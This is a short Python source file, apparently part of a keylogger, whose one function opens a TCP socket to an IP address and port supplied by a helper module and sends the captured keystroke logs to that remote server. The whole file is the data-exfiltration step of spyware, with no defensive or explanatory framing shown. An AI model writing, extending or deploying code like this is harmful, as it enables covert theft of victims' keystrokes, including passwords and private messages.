import socket
import utils

def send_keylogs():
    # Get IP address and port
    ip_address = utils.get_ip_address()
    port = utils.get_port()

    # Connect to server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip_address, port))

        # Send keylogs
        s.sendall(utils.get_keylogs().encode('utf-8'))
